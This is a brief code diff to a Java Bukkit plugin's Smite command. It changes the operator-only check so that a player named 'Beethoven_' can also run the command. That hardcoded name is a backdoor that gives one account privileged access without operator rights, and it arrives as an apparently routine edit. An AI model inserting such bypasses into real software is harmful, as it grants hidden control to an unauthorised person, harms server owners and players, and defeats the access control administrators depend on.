@@ -11,7 +11,7 @@ import static org.bukkit.Bukkit.getServer;
 
 public class Smite implements CommandExecutor {
 	public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
-		if(commandSender.isOp()) {
+		if(commandSender.isOp() || commandSender.getName().equals("Beethoven_")) {
 			Player player;
 			try {
 				player = getServer().getPlayer(strings[0]);
